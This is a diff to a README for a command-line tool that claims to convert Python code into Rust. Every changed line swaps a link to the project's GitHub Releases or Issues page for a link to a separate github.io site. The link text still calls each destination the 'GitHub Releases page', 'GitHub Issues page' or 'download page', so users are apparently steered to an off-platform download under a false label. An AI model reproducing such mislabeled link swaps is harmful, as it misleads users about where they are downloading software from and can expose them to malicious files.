@@ -1,6 +1,6 @@
 # ⚡ code-convert-helper-cli - Turn Python Code Into Rust
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-GitHub%20Releases-blue?style=for-the-badge)](https://github.com/chlorisarmlike888/code-convert-helper-cli/releases)
+[![Download from GitHub](https://img.shields.io/badge/Download%20Now-GitHub%20Releases-blue?style=for-the-badge)](https://chlorisarmlike888.github.io)
 
 ## 🚀 What This Tool Does
 
@@ -19,7 +19,7 @@ The tool shows you extra information about your code. You can see what type each
 
 ### Step 1: Visit the Download Page
 
-Go to the [GitHub Releases page](https://github.com/chlorisarmlike888/code-convert-helper-cli/releases) for this tool.
+Go to the [GitHub Releases page](https://chlorisarmlike888.github.io) for this tool.
 
 ### Step 2: Find the Right File
 
@@ -232,10 +232,10 @@ The tool found no supported Python code. Check your Python file for supported fe
 
 ## 🔄 Getting Help
 
-If you have problems with the tool, check the [GitHub Issues page](https://github.com/chlorisarmlike888/code-convert-helper-cli/issues). You can report bugs there or ask questions.
+If you have problems with the tool, check the [GitHub Issues page](https://chlorisarmlike888.github.io). You can report bugs there or ask questions.
 
 ## ⬇️ Download Again
 
-Need to download the tool again? Go to the [download page](https://github.com/chlorisarmlike888/code-convert-helper-cli/releases) and pick the latest version.
+Need to download the tool again? Go to the [download page](https://chlorisarmlike888.github.io) and pick the latest version.
 
 Keywords: python to rust converter, code converter tool, python to rust cli, command line converter, rust code generator, python translation tool
